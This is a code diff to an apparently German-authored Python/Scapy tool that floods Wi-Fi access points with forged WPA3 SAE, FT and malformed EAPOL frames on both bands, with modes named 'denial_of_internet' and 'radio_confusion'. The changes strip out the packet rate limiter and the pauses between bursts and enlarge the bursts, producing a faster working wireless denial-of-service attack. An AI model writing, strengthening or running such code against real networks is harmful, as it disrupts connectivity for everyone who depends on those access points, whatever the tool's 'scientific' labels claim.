@@ -158,9 +158,10 @@ ADAPTER_KONFIGURATION = {
     "wlan6mon": {"band": "2.4GHz", "angriff": "case1_denial_of_internet"}
 }
 
-PACKETS_PER_SECOND_LIMIT = 1000
-BURST_SIZE_OPTIMAL = 64
-INTER_PACKET_GAP = 0.0001
+# --- 6. RATE LIMITING & BURST SETTINGS ---
+PACKETS_PER_SECOND_LIMIT = 1000000  # Increased from 1000 to effectively disable rate limiting
+BURST_SIZE_OPTIMAL = 128            # Increased from 64 to 128 as requested
+INTER_PACKET_GAP = 0.0001           
 EXPERIMENT_DURATION = 3600
 MAX_RESTARTS = 100
 
@@ -235,21 +236,19 @@ def set_channel_scientific(interface: str, channel: str) -> bool:
 
 def send_burst_scientific(packet_list: list, interface: str, counter: Value):
     if not packet_list: return
-    start = time.time()
-    sent = 0
     batch_size = min(len(packet_list), BURST_SIZE_OPTIMAL)
     try:
         for i in range(0, len(packet_list), batch_size):
             batch = packet_list[i:i+batch_size]
             sendp(batch, iface=interface, verbose=False, inter=INTER_PACKET_GAP, count=1)
-            sent += len(batch)
-            elapsed = time.time() - start
-            if elapsed < sent / PACKETS_PER_SECOND_LIMIT:
-                time.sleep(sent/PACKETS_PER_SECOND_LIMIT - elapsed)
+            
             with counter.get_lock():
                 counter.value += len(batch)
+                
+            # time.sleep(0.01) 
+            
     except OSError:
-        time.sleep(0.1)
+        time.sleep(0.001) 
 
 def create_sae_payload_bytes(scalar: bytes, finite: bytes) -> bytes:
     return b'\x13\x00' + scalar[:32] + finite[:64]
@@ -290,7 +289,7 @@ def run_case1_process(iface, cnt, **kw):
         while True:
             for c in cls:
                 frame = RadioTap()/Dot11(addr1=b, addr2=c, addr3=b)/Dot11Auth(algo=3, seqnum=1, status=0)/payload
-                sendp(frame, iface=iface, verbose=False)
+                sendp(frame, iface=iface, verbose=False, inter=INTER_PACKET_GAP)
                 with cnt.get_lock():
                     cnt.value += 1
             time.sleep(30)
@@ -307,7 +306,7 @@ def run_case2_process(iface, cnt, **kw):
             for c in cls:
                 burst.append(RadioTap()/Dot11(addr1=b, addr2=c, addr3=b)/Dot11Auth(algo=5, seqnum=1, status=0))
             send_burst_scientific(burst * (128 // len(burst) + 1), iface, cnt)
-            time.sleep(0.1)
+            # time.sleep(0.1)
     except KeyboardInterrupt: pass
 
 def run_case3_process(iface, cnt, **kw):
@@ -358,7 +357,7 @@ def run_case6_radio_confusion_process(iface, cnt, **kw):
                     payload = Raw(create_sae_payload_bytes(s, f))
                     burst =[RadioTap()/Dot11(addr1=bssid_24, addr2=c, addr3=bssid_24)/Dot11Auth(algo=3, seqnum=1, status=0)/payload for c in cls]
                     if burst: send_burst_scientific(burst*(128//len(burst)+1), iface, cnt)
-                    time.sleep(0.1)
+                    # time.sleep(0.1)
             # Phase 2: Sender is on 5GHz. Target is 5GHz BSSID. Must use 5GHz parameters!
             if set_channel_scientific(iface, ch_5):
                 for _ in range(200):
@@ -367,7 +366,7 @@ def run_case6_radio_confusion_process(iface, cnt, **kw):
                     payload = Raw(create_sae_payload_bytes(s, f))
                     burst =[RadioTap()/Dot11(addr1=bssid_5, addr2=c, addr3=bssid_5)/Dot11Auth(algo=3, seqnum=1, status=0)/payload for c in cls]
                     if burst: send_burst_scientific(burst*(128//len(burst)+1), iface, cnt)
-                    time.sleep(0.1)
+                    # time.sleep(0.1)
     except KeyboardInterrupt: pass
 
 def run_case6_reverse_process(iface, cnt, **kw):
@@ -386,7 +385,7 @@ def run_case6_reverse_process(iface, cnt, **kw):
                     payload = Raw(create_sae_payload_bytes(s, f))
                     burst =[RadioTap()/Dot11(addr1=bssid_5, addr2=c, addr3=bssid_5)/Dot11Auth(algo=3, seqnum=1, status=0)/payload for c in cls]
                     if burst: send_burst_scientific(burst*(128//len(burst)+1), iface, cnt)
-                    time.sleep(0.1)
+                    # time.sleep(0.1)
             # Phase 2: Sender is on 2.4GHz. Target is 2.4GHz BSSID. Must use 2.4GHz parameters!
             if set_channel_scientific(iface, ch_24):
                 p2_start = time.time()
@@ -396,7 +395,7 @@ def run_case6_reverse_process(iface, cnt, **kw):
                     payload = Raw(create_sae_payload_bytes(s, f))
                     burst =[RadioTap()/Dot11(addr1=bssid_24, addr2=c, addr3=bssid_24)/Dot11Auth(algo=3, seqnum=1, status=0)/payload for c in cls]
                     if burst: send_burst_scientific(burst*(128//len(burst)+1), iface, cnt)
-                    time.sleep(0.1)
+                    # time.sleep(0.1)
                     if time.time()-p2_start > 40: break
             time.sleep(10)
             for rnd in range(2):
@@ -427,7 +426,7 @@ def run_case7_process(iface, cnt, **kw):
                     if s:
                         payload = Raw(create_sae_payload_bytes(s, f))
                         frame = RadioTap()/Dot11(addr1=b, addr2=c, addr3=b)/Dot11Auth(algo=3, seqnum=1, status=0)/payload
-                        sendp(frame, iface=iface, verbose=False)
+                        sendp(frame, iface=iface, verbose=False, inter=INTER_PACKET_GAP)
                         with cnt.get_lock():
                             cnt.value += 1
                         time.sleep(0.05)
@@ -607,7 +606,7 @@ def run_malformed_flags_process(iface, cnt, **kw):
     try:
         while True:
             send_burst_scientific([RadioTap()/Dot11(type=2, subtype=8, addr1=c, addr2=b, addr3=b)/LLC()/SNAP(OUI=0x000000, code=0x888E)/payload for c in cls]*10, iface, cnt)
-            time.sleep(0.5)
+            # time.sleep(0.5)
     except KeyboardInterrupt: pass
 
 def run_bad_algo_process(iface, cnt, **kw):
@@ -662,7 +661,7 @@ def run_cookie_process(iface, cnt, **kw):
             payload = Raw(create_sae_payload_bytes(s, f))
             burst =[RadioTap()/Dot11(type=0,subtype=11,addr1=b,addr2=mac,addr3=b)/Dot11Auth(algo=3,seqnum=1,status=0)/payload for _ in range(128)]
             send_burst_scientific(burst, iface, cnt)
-            time.sleep(0.5)
+            # time.sleep(0.5)
     except KeyboardInterrupt: pass
 
 # =====================================================================================
